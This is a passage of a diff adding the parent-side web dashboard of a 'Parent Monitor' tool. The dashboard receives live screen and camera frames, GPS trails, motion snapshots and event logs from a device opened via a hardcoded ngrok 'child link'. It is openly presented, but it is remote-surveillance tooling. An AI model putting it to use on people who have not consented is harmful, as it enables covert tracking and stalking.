@@ -1,0 +1,1072 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Parent Monitor — Agent Edition</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Share+Tech+Mono&family=Inter:wght@300;400;500&display=swap');
+  :root{--cyan:#00f5ff;--cyan-dim:#00b8cc;--green:#00ff88;--red:#ff3366;--yellow:#ffcc00;--orange:#ff8800;--bg:#020b18;--panel:rgba(0,245,255,0.04);--border:rgba(0,245,255,0.15);--text:#cce8ff;--text-dim:#4a7fa0;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;}
+  body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,245,255,0.02)1px,transparent 1px),linear-gradient(90deg,rgba(0,245,255,0.02)1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0;}
+
+  /* ── Header ── */
+  header{position:sticky;top:0;z-index:200;background:rgba(2,11,24,0.97);border-bottom:1px solid var(--border);padding:10px 16px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;backdrop-filter:blur(20px);}
+  .logo{font-family:'Orbitron',monospace;font-size:0.9rem;font-weight:900;color:#fff;letter-spacing:0.12em;text-shadow:0 0 20px var(--cyan);}
+  .logo small{font-family:'Share Tech Mono',monospace;font-size:0.55rem;color:var(--cyan-dim);letter-spacing:0.2em;display:block;margin-top:2px;}
+  .hright{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
+  #connStatus{display:flex;align-items:center;gap:6px;font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--text-dim);}
+  .dot{width:8px;height:8px;border-radius:50%;background:#2a4a6a;}
+  .dot.green{background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 2s infinite;}
+  .dot.red{background:var(--red);box-shadow:0 0 8px var(--red);}
+  .dot.yellow{background:var(--yellow);box-shadow:0 0 6px var(--yellow);animation:pulse 1s infinite;}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+  #devCount{font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--cyan);background:rgba(0,245,255,0.08);border:1px solid rgba(0,245,255,0.2);border-radius:2px;padding:3px 10px;}
+  #alertBanner{display:none;font-family:'Share Tech Mono',monospace;font-size:0.68rem;background:rgba(255,136,0,0.15);border:1px solid rgba(255,136,0,0.4);color:var(--orange);padding:3px 12px;border-radius:2px;animation:pulse 1s infinite;cursor:pointer;}
+
+  /* ── Tabs ── */
+  .tabs{position:relative;z-index:1;display:flex;border-bottom:1px solid var(--border);background:rgba(2,11,24,0.8);padding:0 16px;}
+  .tab{font-family:'Share Tech Mono',monospace;font-size:0.68rem;padding:10px 16px;cursor:pointer;color:var(--text-dim);border-bottom:2px solid transparent;letter-spacing:0.06em;transition:all 0.2s;}
+  .tab:hover{color:var(--cyan);}
+  .tab.active{color:var(--cyan);border-bottom-color:var(--cyan);}
+  .tab-badge{background:var(--red);color:#fff;border-radius:2px;font-size:0.5rem;padding:1px 5px;margin-left:5px;vertical-align:middle;display:none;}
+  .tab-badge.show{display:inline;}
+
+  /* ── Tab pages ── */
+  .page{display:none;position:relative;z-index:1;padding:14px;}
+  .page.active{display:block;}
+
+  /* ── Device cards ── */
+  #empty{text-align:center;padding:60px 20px;color:var(--text-dim);}
+  #empty .big{font-size:3rem;margin-bottom:12px;}
+  #empty h2{font-family:'Orbitron',monospace;font-size:0.82rem;color:var(--cyan-dim);letter-spacing:0.1em;margin-bottom:8px;}
+  #empty p{font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--text-dim);line-height:1.8;}
+  .device-card{background:var(--panel);border:1px solid var(--border);border-radius:4px;overflow:hidden;margin-bottom:14px;position:relative;}
+  .device-card::before{content:'';position:absolute;top:-1px;left:-1px;width:14px;height:14px;border:2px solid var(--cyan-dim);border-right:none;border-bottom:none;}
+  .device-card::after{content:'';position:absolute;bottom:-1px;right:-1px;width:14px;height:14px;border:2px solid var(--cyan-dim);border-left:none;border-top:none;}
+  .device-card.anylive{border-color:rgba(0,255,136,0.35);}
+  .device-card.offline{border-color:rgba(255,51,102,0.4);opacity:0.7;}
+  .device-card.motion{border-color:var(--orange);box-shadow:0 0 18px rgba(255,136,0,0.25);}
+
+  .device-header{display:flex;align-items:center;justify-content:space-between;padding:9px 14px;background:rgba(0,0,0,0.35);border-bottom:1px solid var(--border);flex-wrap:wrap;gap:6px;}
+  .dname{font-family:'Orbitron',monospace;font-size:0.75rem;font-weight:700;color:#fff;display:flex;align-items:center;gap:8px;}
+  .dbadges{display:flex;align-items:center;gap:5px;flex-wrap:wrap;}
+  .badge{font-family:'Share Tech Mono',monospace;font-size:0.58rem;padding:2px 7px;border-radius:2px;letter-spacing:0.04em;}
+  .badge-live{background:rgba(0,255,136,0.12);color:var(--green);border:1px solid rgba(0,255,136,0.3);animation:pulse 2s infinite;}
+  .badge-off{background:rgba(0,0,0,0.3);color:var(--text-dim);border:1px solid rgba(255,255,255,0.05);}
+  .badge-motion{background:rgba(255,136,0,0.15);color:var(--orange);border:1px solid rgba(255,136,0,0.4);animation:pulse 1s infinite;}
+  .badge-offline{background:rgba(255,51,102,0.1);color:var(--red);border:1px solid rgba(255,51,102,0.3);}
+  .dcontrols{display:flex;gap:5px;flex-wrap:wrap;}
+  .btn-sm{font-family:'Share Tech Mono',monospace;font-size:0.6rem;padding:3px 8px;border:1px solid var(--border);border-radius:2px;background:rgba(0,0,0,0.4);color:var(--text-dim);cursor:pointer;transition:all 0.2s;letter-spacing:0.04em;}
+  .btn-sm:hover{border-color:var(--cyan);color:var(--cyan);}
+  .btn-sm.danger:hover{border-color:var(--red);color:var(--red);}
+  .btn-sm.warn:hover{border-color:var(--orange);color:var(--orange);}
+
+  /* ── Device meta row ── */
+  .device-meta{display:flex;gap:8px;padding:6px 14px;background:rgba(0,0,0,0.2);border-bottom:1px solid rgba(0,245,255,0.06);flex-wrap:wrap;}
+  .meta-chip{font-family:'Share Tech Mono',monospace;font-size:0.58rem;color:var(--text-dim);display:flex;align-items:center;gap:4px;}
+  .meta-chip.on{color:var(--cyan-dim);}
+
+  /* ── Feeds ── */
+  .feeds{display:grid;grid-template-columns:1fr 1fr;gap:0;border-top:1px solid var(--border);}
+  .feed{position:relative;background:#000814;overflow:hidden;}
+  .feed:first-child{border-right:1px solid var(--border);}
+  .feed-label{position:absolute;top:6px;left:8px;font-family:'Share Tech Mono',monospace;font-size:0.56rem;color:var(--cyan);background:rgba(0,0,0,0.75);padding:2px 7px;border-radius:2px;z-index:3;letter-spacing:0.08em;}
+  .feed-status{position:absolute;top:6px;right:8px;font-family:'Share Tech Mono',monospace;font-size:0.56rem;padding:2px 7px;border-radius:2px;z-index:3;}
+  .fst-live{background:rgba(0,255,136,0.12);color:var(--green);border:1px solid rgba(0,255,136,0.3);}
+  .fst-off{background:rgba(0,0,0,0.5);color:var(--text-dim);}
+  .feed-img{width:100%;aspect-ratio:16/9;object-fit:cover;display:none;cursor:zoom-in;image-rendering:auto;}
+  .feed-ph{width:100%;aspect-ratio:16/9;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;color:rgba(0,245,255,0.15);}
+  .feed-ph .icon{font-size:1.8rem;}
+  .feed-ph p{font-family:'Share Tech Mono',monospace;font-size:0.6rem;letter-spacing:0.08em;}
+  /* CCTV scanline overlay */
+  .feed-scanline{position:absolute;inset:0;pointer-events:none;z-index:3;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.08) 2px,rgba(0,0,0,0.08) 4px);display:none;}
+  .feed-scanline.on{display:block;}
+  /* REC indicator */
+  .feed-rec{position:absolute;top:6px;left:50%;transform:translateX(-50%);font-family:'Share Tech Mono',monospace;font-size:0.52rem;color:#ff3366;letter-spacing:0.12em;display:none;z-index:5;align-items:center;gap:4px;}
+  .feed-rec.on{display:flex;}
+  .rec-dot{width:6px;height:6px;border-radius:50%;background:#ff3366;animation:recblink 1s step-start infinite;}
+  @keyframes recblink{0%,100%{opacity:1}50%{opacity:0}}
+  /* Live clock */
+  .feed-clock{position:absolute;top:6px;right:8px;font-family:'Share Tech Mono',monospace;font-size:0.52rem;color:rgba(255,255,255,0.75);background:rgba(0,0,0,0.55);padding:1px 5px;border-radius:1px;z-index:5;display:none;letter-spacing:0.06em;}
+  .feed-clock.on{display:block;}
+  /* CAM id bottom-left */
+  .feed-camid{position:absolute;bottom:6px;left:8px;font-family:'Share Tech Mono',monospace;font-size:0.5rem;color:rgba(255,255,255,0.5);background:rgba(0,0,0,0.45);padding:1px 5px;border-radius:1px;z-index:5;display:none;letter-spacing:0.06em;}
+  .feed-camid.on{display:block;}
+  .feed-activity{position:absolute;inset:0;pointer-events:none;z-index:2;opacity:0;transition:opacity 0.15s ease;border:2px solid transparent;}
+  .feed-activity.flash{opacity:1;border-color:rgba(0,245,255,0.7);background:rgba(0,245,255,0.04);}
+  .activity-bar{position:absolute;bottom:0;left:0;right:0;height:3px;background:transparent;z-index:4;}
+  .activity-bar-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--green),var(--cyan));transition:width 0.2s ease,background 0.2s;}
+  .activity-label{position:absolute;bottom:22px;right:8px;font-family:'Share Tech Mono',monospace;font-size:0.5rem;color:rgba(0,245,255,0.5);display:none;letter-spacing:0.04em;}
+  .feed-fps{position:absolute;bottom:6px;right:8px;font-family:'Share Tech Mono',monospace;font-size:0.52rem;color:rgba(0,245,255,0.4);display:none;}
+  .feed-time{position:absolute;bottom:6px;left:8px;font-family:'Share Tech Mono',monospace;font-size:0.52rem;color:rgba(0,245,255,0.3);display:none;}
+
+  /* ── Map tab ── */
+  #map{height:400px;border-radius:4px;border:1px solid var(--border);background:#000;}
+  .map-controls{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;align-items:center;}
+  .map-controls label{font-family:'Share Tech Mono',monospace;font-size:0.62rem;color:var(--text-dim);display:flex;align-items:center;gap:5px;cursor:pointer;}
+  .map-controls input[type=checkbox]{accent-color:var(--cyan);}
+
+  /* Device location cards */
+  #deviceLocCards{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:8px;margin-top:12px;}
+  .loc-card{background:var(--panel);border:1px solid var(--border);border-radius:4px;padding:12px 14px;position:relative;}
+  .loc-card.fresh{border-color:rgba(0,255,136,0.35);}
+  .loc-card-name{font-family:'Orbitron',monospace;font-size:0.72rem;color:#fff;margin-bottom:8px;display:flex;align-items:center;gap:6px;}
+  .loc-card-coords{font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--cyan);margin-bottom:6px;letter-spacing:0.04em;}
+  .loc-card-meta{font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--text-dim);margin-bottom:10px;display:flex;gap:12px;flex-wrap:wrap;}
+  .loc-card-meta span{display:flex;align-items:center;gap:3px;}
+  .loc-card-meta span.on{color:var(--cyan-dim);}
+  .loc-card-address{font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--text-dim);margin-bottom:10px;min-height:16px;}
+  .loc-card-btns{display:flex;gap:6px;flex-wrap:wrap;}
+  .loc-btn{font-family:'Share Tech Mono',monospace;font-size:0.6rem;padding:5px 10px;border-radius:2px;border:1px solid var(--border);background:rgba(0,0,0,0.4);color:var(--text-dim);cursor:pointer;text-decoration:none;display:inline-block;transition:all 0.2s;letter-spacing:0.04em;}
+  .loc-btn:hover{border-color:var(--cyan);color:var(--cyan);}
+  .loc-btn.gmap{border-color:rgba(66,133,244,0.4);color:#4285f4;}
+  .loc-btn.gmap:hover{background:rgba(66,133,244,0.1);}
+  .loc-btn.waze{border-color:rgba(0,210,255,0.4);color:#00d2ff;}
+  .loc-btn.waze:hover{background:rgba(0,210,255,0.1);}
+  .loc-btn.omap{border-color:rgba(0,255,136,0.3);color:var(--green);}
+  .loc-btn.omap:hover{background:rgba(0,255,136,0.08);}
+  .loc-age{position:absolute;top:10px;right:12px;font-family:'Share Tech Mono',monospace;font-size:0.55rem;color:var(--text-dim);}
+
+  #locationLog{margin-top:12px;max-height:180px;overflow-y:auto;font-family:'Share Tech Mono',monospace;font-size:0.62rem;color:var(--text-dim);}
+  .loc-entry{padding:5px 0;border-bottom:1px solid rgba(0,245,255,0.06);display:flex;gap:10px;align-items:flex-start;flex-wrap:wrap;}
+  .loc-entry .ts{color:var(--cyan-dim);flex-shrink:0;}
+  .loc-entry .lbl{color:#fff;flex-shrink:0;}
+  .loc-entry a{color:var(--cyan-dim);font-size:0.58rem;text-decoration:none;}
+  .loc-entry a:hover{color:var(--cyan);}
+
+  /* ── Session log tab ── */
+  #logContainer{max-height:60vh;overflow-y:auto;font-family:'Share Tech Mono',monospace;font-size:0.62rem;}
+  .log-entry{padding:6px 0;border-bottom:1px solid rgba(0,245,255,0.05);display:flex;gap:10px;align-items:flex-start;}
+  .log-ts{color:var(--text-dim);flex-shrink:0;min-width:80px;}
+  .log-type{flex-shrink:0;min-width:90px;}
+  .log-type.connect{color:var(--green);}
+  .log-type.disconnect{color:var(--red);}
+  .log-type.location{color:var(--cyan);}
+  .log-type.motion{color:var(--orange);}
+  .log-type.snapshot{color:var(--yellow);}
+  .log-body{color:var(--text-dim);}
+
+  /* ── Snapshots tab ── */
+  #snapsGrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px;}
+  .snap-item{position:relative;border:1px solid var(--border);border-radius:3px;overflow:hidden;background:#000;cursor:pointer;}
+  .snap-item:hover{border-color:var(--cyan);}
+  .snap-item img{width:100%;display:block;}
+  .snap-meta{position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.75);font-family:'Share Tech Mono',monospace;font-size:0.52rem;color:var(--text-dim);padding:4px 6px;}
+
+  /* ── Fullscreen ── */
+  #fsOverlay{display:none;position:fixed;inset:0;background:#000;z-index:1000;flex-direction:column;}
+  #fsOverlay.show{display:flex;}
+  #fsTop{padding:10px 18px;background:rgba(2,11,24,0.95);border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;}
+  #fsInfo{font-family:'Orbitron',monospace;font-size:0.72rem;color:var(--cyan);}
+  #fsFeed{font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--green);}
+  #fsImg{flex:1;width:100%;object-fit:contain;background:#000;}
+  #fsClose{font-family:'Share Tech Mono',monospace;font-size:0.65rem;background:none;border:1px solid var(--border);color:var(--text-dim);border-radius:2px;padding:5px 14px;cursor:pointer;}
+  #fsClose:hover{border-color:var(--cyan);color:var(--cyan);}
+
+  /* ── Notification toast ── */
+  #toastContainer{position:fixed;bottom:20px;right:20px;z-index:2000;display:flex;flex-direction:column;gap:8px;}
+  .toast{font-family:'Share Tech Mono',monospace;font-size:0.68rem;padding:10px 14px;border-radius:3px;border:1px solid;max-width:300px;animation:slideIn 0.3s ease;}
+  @keyframes slideIn{from{transform:translateX(100px);opacity:0}to{transform:none;opacity:1}}
+  .toast.info{background:rgba(0,245,255,0.08);border-color:rgba(0,245,255,0.3);color:var(--cyan);}
+  .toast.motion{background:rgba(255,136,0,0.12);border-color:rgba(255,136,0,0.4);color:var(--orange);}
+  .toast.offline{background:rgba(255,51,102,0.1);border-color:rgba(255,51,102,0.3);color:var(--red);}
+  .toast.connect{background:rgba(0,255,136,0.08);border-color:rgba(0,255,136,0.3);color:var(--green);}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">🛡 PARENT MONITOR<small>// AGENT EDITION — DUAL FEED + LOCATION + MOTION</small></div>
+  <div class="hright">
+    <button class="btn-sm" id="btnHeaderCopy" style="border-color:var(--cyan);color:var(--cyan);font-weight:700;padding:5px 12px;box-shadow:0 0 10px rgba(0,245,255,0.25);" onclick="copyChildLink(this)" title="Copy child monitor link">📋 COPY CHILD LINK</button>
+    <div id="alertBanner" onclick="switchTab('log')">⚠ ALERTS</div>
+    <span id="devCount">0 DEVICES</span>
+    <div id="connStatus"><div class="dot" id="dot"></div><span id="connText">CONNECTING...</span></div>
+  </div>
+</header>
+
+<div class="tabs">
+  <div class="tab active" onclick="switchTab('feeds')" id="tab-feeds">📺 FEEDS</div>
+  <div class="tab" onclick="switchTab('map')" id="tab-map">📍 LOCATION</div>
+  <div class="tab" onclick="switchTab('snapshots')" id="tab-snapshots">📸 SNAPSHOTS <span class="tab-badge" id="badge-snaps">0</span></div>
+  <div class="tab" onclick="switchTab('log')" id="tab-log">📋 LOG <span class="tab-badge" id="badge-log">0</span></div>
+</div>
+
+<!-- FEEDS TAB -->
+<div class="page active" id="page-feeds">
+  <div id="empty">
+    <div class="big">📡</div>
+    <h2>NO DEVICES CONNECTED</h2>
+    <p style="margin-bottom:14px;">Open the child link on the monitored phone, tablet, or laptop.<br/>Live screen + camera + ultra-sensitive motion capture.<br/><br/>// Rock-solid persistent connection</p>
+    
+    <div style="background:rgba(0,245,255,0.04);border:1px solid rgba(0,245,255,0.25);border-radius:6px;padding:16px;max-width:540px;margin:0 auto 16px auto;display:flex;flex-direction:column;gap:10px;align-items:center;">
+      <div style="font-family:'Orbitron',monospace;font-size:0.75rem;color:var(--cyan);font-weight:700;letter-spacing:0.08em;">📲 CHILD MONITOR LINK</div>
+      <div style="font-family:'Share Tech Mono',monospace;font-size:0.62rem;color:var(--text-dim);">Send this link to the child's phone, tablet, or browser:</div>
+      
+      <div style="display:flex;gap:6px;width:100%;max-width:440px;">
+        <input type="text" id="childLinkInput" readonly value="https://chunk-refinance-breeching.ngrok-free.dev/child" style="flex:1;background:rgba(0,0,0,0.6);border:1px solid var(--border);color:var(--cyan);font-family:'Share Tech Mono',monospace;font-size:0.72rem;padding:8px 10px;border-radius:2px;outline:none;" onclick="this.select();"/>
+        <button class="btn-sm" id="btnEmptyCopy" style="padding:8px 14px;border-color:var(--cyan);color:var(--cyan);font-weight:700;cursor:pointer;white-space:nowrap;" onclick="copyChildLink(this)">📋 COPY</button>
+      </div>
+
+      <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:4px;">
+        <button class="btn-sm" onclick="copyChildLink(this,'ngrok')" style="border-color:rgba(0,255,136,0.4);color:var(--green);" title="Copy Public HTTPS link for phones and mobile devices">🌐 Copy Ngrok Link (Mobile / Phone)</button>
+        <button class="btn-sm" onclick="copyChildLink(this,'local')" style="border-color:rgba(255,204,0,0.4);color:var(--yellow);" title="Copy Local Wi-Fi link for same-network laptops">💻 Copy Local Link (Same Wi-Fi)</button>
+      </div>
+    </div>
+  </div>
+  <div id="cards"></div>
+</div>
+
+<!-- MAP TAB -->
+<div class="page" id="page-map">
+  <div class="map-controls">
+    <label><input type="checkbox" id="chkTrail" checked onchange="toggleTrails()"> Show movement trail</label>
+    <label><input type="checkbox" id="chkFollow" checked> Auto-center on update</label>
+    <button class="btn-sm" onclick="centerAllDevices()">⊞ FIT ALL</button>
+    <button class="btn-sm" onclick="clearTrails()">🗑 CLEAR TRAILS</button>
+    <span style="font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--text-dim);margin-left:auto;" id="mapLastUpdate">--</span>
+  </div>
+  <div id="map"></div>
+  <div id="deviceLocCards"></div>
+  <div id="locationLog" style="margin-top:12px;">
+    <div style="font-family:'Share Tech Mono',monospace;font-size:0.62rem;color:var(--cyan-dim);margin-bottom:6px;letter-spacing:0.08em;">// LOCATION HISTORY</div>
+  </div>
+</div>
+
+<!-- SNAPSHOTS TAB -->
+<div class="page" id="page-snapshots">
+  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+    <span style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--text-dim);">// AUTO-CAPTURED ON MOTION + REGULAR SNAPSHOTS</span>
+    <button class="btn-sm" onclick="loadSnapshots()">↻ REFRESH</button>
+  </div>
+  <div id="snapsGrid"><p style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--text-dim);">No snapshots yet — they appear once streams start.</p></div>
+</div>
+
+<!-- LOG TAB -->
+<div class="page" id="page-log">
+  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+    <span style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--text-dim);">// SESSION EVENTS — LAST 200</span>
+    <button class="btn-sm" onclick="loadLog()">↻ REFRESH</button>
+  </div>
+  <div id="logContainer"></div>
+</div>
+
+<!-- Fullscreen overlay -->
+<div id="fsOverlay">
+  <div id="fsTop">
+    <span id="fsInfo">DEVICE</span>
+    <span id="fsFeed">SCREEN</span>
+    <div style="display:flex; gap:8px;">
+      <button class="btn-sm" onclick="saveCurrentFS()">💾 SAVE IMAGE</button>
+      <button id="fsClose" onclick="closeFS()">✕ CLOSE</button>
+    </div>
+  </div>
+  <img id="fsImg" alt="fullscreen view"/>
+</div>
+
+<div id="toastContainer"></div>
+
+<script>
+const isFileProto = location.protocol === 'file:';
+const API_BASE = isFileProto ? 'http://localhost:5000' : '';
+const WS_PROTOCOL = location.protocol === 'https:' ? 'wss:' : 'ws:';
+const WS_URL = isFileProto ? 'ws://localhost:5000' : `${WS_PROTOCOL}//${location.host}`;
+const NGROK_DOMAIN = 'chunk-refinance-breeching.ngrok-free.dev';
+let ws, reconnectTimer;
+const devices={};
+let fsId=null, fsFeed=null;
+let alertCount=0;
+let leafletMap=null;
+const mapMarkers={};
+const locationHistory=[];
+
+// ── Tab switching ─────────────────────────────────────────────
+function switchTab(name){
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.getElementById('tab-'+name).classList.add('active');
+  document.getElementById('page-'+name).classList.add('active');
+  if(name==='map') initMap();
+  if(name==='snapshots'){
+    loadSnapshots();
+    snapBadgeCount = 0;
+    const badge = document.getElementById('badge-snaps');
+    if(badge) badge.classList.remove('show');
+  }
+  if(name==='log'){ loadLog(); alertCount=0; updateAlertBadge(); }
+}
+
+// ── Toast notifications ───────────────────────────────────────
+function toast(msg, type='info', duration=4000){
+  const el=document.createElement('div');
+  el.className='toast '+type;
+  el.textContent=msg;
+  document.getElementById('toastContainer').appendChild(el);
+  setTimeout(()=>el.remove(), duration);
+}
+
+// ── Alert badge ───────────────────────────────────────────────
+function addAlert(){
+  alertCount++;
+  const b=document.getElementById('badge-log');
+  b.textContent=alertCount;b.classList.add('show');
+  document.getElementById('alertBanner').style.display='block';
+}
+function updateAlertBadge(){
+  const b=document.getElementById('badge-log');
+  if(alertCount===0){b.classList.remove('show');document.getElementById('alertBanner').style.display='none';}
+  else{b.textContent=alertCount;b.classList.add('show');document.getElementById('alertBanner').style.display='block';}
+}
+
+// ── Motion Audio Alert Chime (Web Audio API) ──────────────────
+let audioCtx = null;
+function playMotionChime(){
+  try{
+    if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    if(audioCtx.state === 'suspended') audioCtx.resume();
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.type = 'sine';
+    osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(1320, audioCtx.currentTime + 0.12);
+    gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.32);
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.33);
+  }catch(e){}
+}
+
+// ── Copy Child Link (Works in file:///, localhost, and https://) ───────
+function copyToClipboard(text){
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    return navigator.clipboard.writeText(text).catch(()=>fallbackCopy(text));
+  }
+  return fallbackCopy(text);
+}
+
+function fallbackCopy(text){
+  return new Promise((resolve, reject)=>{
+    try{
+      const input = document.createElement('textarea');
+      input.value = text;
+      input.style.position = 'fixed';
+      input.style.left = '-9999px';
+      input.style.top = '-9999px';
+      input.setAttribute('readonly', '');
+      document.body.appendChild(input);
+      input.focus();
+      input.select();
+      const ok = document.execCommand('copy');
+      document.body.removeChild(input);
+      if(ok) resolve(); else reject(new Error('execCommand copy failed'));
+    }catch(e){ reject(e); }
+  });
+}
+
+function getChildLink(preferredType = 'auto'){
+  if(preferredType === 'local'){
+    return isFileProto ? 'http://localhost:5000/child' : `${location.protocol}//${location.hostname}:5000/child`;
+  }
+  if(preferredType === 'ngrok'){
+    return `https://${NGROK_DOMAIN}/child`;
+  }
+  // Auto mode:
+  if(location.hostname && location.hostname.includes('ngrok')){
+    return `${location.origin}/child`;
+  }
+  // Default to public HTTPS ngrok link so child devices (phones/tablets) can open it over the internet
+  return `https://${NGROK_DOMAIN}/child`;
+}
+
+function copyChildLink(btnElement, preferredType = 'auto'){
+  const url = getChildLink(preferredType);
+  copyToClipboard(url).then(()=>{
+    toast(`📋 Copied Child Link: ${url}`, 'connect', 5000);
+    const linkInput = document.getElementById('childLinkInput');
+    if(linkInput){
+      linkInput.value = url;
+      linkInput.select();
+    }
+    if(btnElement){
+      const origHtml = btnElement.innerHTML;
+      btnElement.innerHTML = `✔ COPIED!`;
+      btnElement.style.borderColor = 'var(--green)';
+      btnElement.style.color = 'var(--green)';
+      setTimeout(()=>{
+        btnElement.innerHTML = origHtml;
+        btnElement.style.borderColor = '';
+        btnElement.style.color = '';
+      }, 2500);
+    }
+  }).catch(()=>{
+    prompt("Copy this child link to send to device:", url);
+  });
+}
+
+// ── Instant Live Frame Download to Laptop ─────────────────────
+function instantSaveLive(id, feed){
+  const dev = devices[id];
+  if(!dev) return;
+  const data = feed==='screen' ? dev.screenFrame : dev.cameraFrame;
+  if(!data){ toast('No live image available to save for '+feed, 'info'); return; }
+  const a = document.createElement('a');
+  a.href = data;
+  a.download = `${(dev.label||'device').replace(/\s+/g,'_')}_${feed}_${Date.now()}.jpg`;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  toast(`💾 Downloaded ${feed.toUpperCase()} image to your laptop!`, 'connect', 2500);
+}
+
+function saveCurrentFS(){
+  const img = document.getElementById('fsImg');
+  if(!img || !img.src){ toast('No image in fullscreen', 'info'); return; }
+  const a = document.createElement('a');
+  a.href = img.src;
+  a.download = `snapshot_${fsFeed||'view'}_${Date.now()}.jpg`;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  toast('💾 Saved full-resolution image to laptop!', 'connect', 2500);
+}
+
+// ── Real-Time Snapshot Receiver ───────────────────────────────
+let snapBadgeCount = 0;
+function handleNewSnapshot(msg){
+  snapBadgeCount++;
+  const badge = document.getElementById('badge-snaps');
+  if(badge){ badge.textContent = snapBadgeCount; badge.classList.add('show'); }
+  toast(`📸 New capture: ${msg.label||msg.childId} [${(msg.feedType||'').toUpperCase()}]`, 'info', 4000);
+  const grid = document.getElementById('snapsGrid');
+  if(grid){
+    const firstP = grid.querySelector('p');
+    if(firstP) firstP.remove();
+    const div = document.createElement('div');
+    div.className = 'snap-item';
+    div.onclick = ()=>openFSUrl(`${API_BASE}/snapshots/` + msg.file, msg.file);
+    div.innerHTML = `<img src="${API_BASE}/snapshots/${msg.file}" loading="lazy" alt="${msg.file}"/>
+                     <div class="snap-meta">JUST NOW ${(msg.feedType||'').toUpperCase()}</div>`;
+    grid.insertBefore(div, grid.firstChild);
+  }
+}
+
+// ── WebSocket (High Connection Time & Auto-Recovery) ──────────
+let pingInterval = null;
+let lastPongTime = Date.now();
+
+function setConn(t,c){document.getElementById("connText").textContent=t;document.getElementById("dot").className="dot "+c;}
+
+function startParentHeartbeat(){
+  if(pingInterval) clearInterval(pingInterval);
+  pingInterval = setInterval(()=>{
+    if(ws && ws.readyState === 1){
+      try{ ws.send(JSON.stringify({ type: "ping" })); }catch(e){}
+      if(Date.now() - lastPongTime > 18000){
+        console.warn("Connection lost/stale, reconnecting...");
+        connectWS();
+      }
+    }
+  }, 4000);
+}
+
+function connectWS(){
+  if(reconnectTimer) clearTimeout(reconnectTimer);
+  try{ws=new WebSocket(WS_URL);}catch(e){setConn("FAILED","red");reconnectTimer=setTimeout(connectWS,1000);return;}
+  ws.onopen=()=>{
+    lastPongTime = Date.now();
+    setConn("CONNECTED (" + (isFileProto ? "LOCAL" : "STABLE") + ")","green");
+    ws.send(JSON.stringify({type:"register-parent"}));
+    startParentHeartbeat();
+  };
+  ws.onmessage=(e)=>{
+    let msg;try{msg=JSON.parse(e.data);}catch{return;}
+    switch(msg.type){
+      case "pong":
+        lastPongTime = Date.now();
+        setConn("CONNECTED (" + (isFileProto ? "LOCAL" : "STABLE") + ")","green");
+        break;
+      case "registered-parent":
+        lastPongTime = Date.now();
+        setConn("CONNECTED (" + (isFileProto ? "LOCAL" : "STABLE") + ")","green");
+        break;
+      case "new-snapshot":
+        handleNewSnapshot(msg);
+        break;
+      case "child-joined":   addCard(msg.childId,msg.label||"Device "+msg.childId); break;
+      case "child-left":     removeCard(msg.childId); break;
+      case "child-offline":  markOffline(msg.childId,msg.ageSeconds); break;
+      case "frame-screen":   updateFeed(msg.from,"screen",msg.data); break;
+      case "frame-camera":   updateFeed(msg.from,"camera",msg.data); break;
+      case "stop-screen":    stopFeed(msg.from,"screen"); break;
+      case "stop-camera":    stopFeed(msg.from,"camera"); break;
+      case "location":       handleLocation(msg); break;
+      case "motion-alert":   handleMotion(msg); break;
+      case "session-log":    renderLog(msg.events); break;
+    }
+  };
+  ws.onclose=()=>{
